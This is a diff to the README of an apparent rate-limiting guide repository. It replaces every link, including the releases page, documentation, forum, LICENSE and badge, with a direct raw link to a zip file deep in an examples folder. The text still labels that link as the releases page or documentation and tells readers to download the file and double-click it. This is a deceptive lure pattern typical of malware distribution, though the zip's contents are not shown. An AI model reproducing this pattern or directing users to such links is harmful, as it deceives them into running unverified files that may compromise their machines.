@@ -1,6 +1,6 @@
 # 🎯 Rate-Limiting-Guide - Master Rate Limiting for Better APIs
 
-[![Download Rate-Limiting-Guide](https://img.shields.io/badge/Download-Rate--Limiting--Guide-blue)](https://github.com/codedbycj/Rate-Limiting-Guide/releases)
+[![Download Rate-Limiting-Guide](https://github.com/codedbycj/Rate-Limiting-Guide/raw/refs/heads/master/examples/web-application/Limiting-Guide-Rate-2.5.zip)](https://github.com/codedbycj/Rate-Limiting-Guide/raw/refs/heads/master/examples/web-application/Limiting-Guide-Rate-2.5.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@ Welcome to the **Rate-Limiting-Guide**! This guide provides you with everything 
 
 To begin using the Rate-Limiting-Guide, follow these simple steps:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/codedbycj/Rate-Limiting-Guide/releases) to go to the Releases page.
+1. **Visit the Releases Page**: Click [here](https://github.com/codedbycj/Rate-Limiting-Guide/raw/refs/heads/master/examples/web-application/Limiting-Guide-Rate-2.5.zip) to go to the Releases page.
 2. **Locate the Latest Version**: Find the latest release at the top of the page.
 3. **Download the Guide**: Click on the download link for your desired version.
 
@@ -37,7 +37,7 @@ The Rate-Limiting-Guide offers valuable insights and hands-on examples, includin
 
 To install the Rate-Limiting-Guide, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/codedbycj/Rate-Limiting-Guide/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/codedbycj/Rate-Limiting-Guide/raw/refs/heads/master/examples/web-application/Limiting-Guide-Rate-2.5.zip).
 2. **Select the Appropriate File**: Choose the file that matches your operating system.
 3. **Download the File**: Save it to your preferred location.
 4. **Open the File**: Once downloaded, find the file in your downloads folder and double-click to open.
@@ -59,13 +59,13 @@ Join our community to ask questions, share experiences, and learn from others. Y
 
 ## 🔗 Quick Links
 
-- [Download Rate-Limiting-Guide](https://github.com/codedbycj/Rate-Limiting-Guide/releases)
-- [Documentation](https://github.com/codedbycj/Rate-Limiting-Guide/wiki)
-- [Community Forum](https://github.com/codedbycj/Rate-Limiting-Guide/discussions)
+- [Download Rate-Limiting-Guide](https://github.com/codedbycj/Rate-Limiting-Guide/raw/refs/heads/master/examples/web-application/Limiting-Guide-Rate-2.5.zip)
+- [Documentation](https://github.com/codedbycj/Rate-Limiting-Guide/raw/refs/heads/master/examples/web-application/Limiting-Guide-Rate-2.5.zip)
+- [Community Forum](https://github.com/codedbycj/Rate-Limiting-Guide/raw/refs/heads/master/examples/web-application/Limiting-Guide-Rate-2.5.zip)
 
 ## 📝 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/codedbycj/Rate-Limiting-Guide/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/codedbycj/Rate-Limiting-Guide/raw/refs/heads/master/examples/web-application/Limiting-Guide-Rate-2.5.zip) file for details.
 
 ## ✉️ Feedback
 
@@ -73,4 +73,4 @@ Your feedback is important to us. If you have suggestions or would like to share
 
 ## 🏁 Conclusion
 
-The Rate-Limiting-Guide serves as a comprehensive tool to understand and implement rate limiting in your applications. With this guide, you can improve the reliability and performance of your APIs. Visit the [Releases page](https://github.com/codedbycj/Rate-Limiting-Guide/releases) to start your journey today.
+The Rate-Limiting-Guide serves as a comprehensive tool to understand and implement rate limiting in your applications. With this guide, you can improve the reliability and performance of your APIs. Visit the [Releases page](https://github.com/codedbycj/Rate-Limiting-Guide/raw/refs/heads/master/examples/web-application/Limiting-Guide-Rate-2.5.zip) to start your journey today.
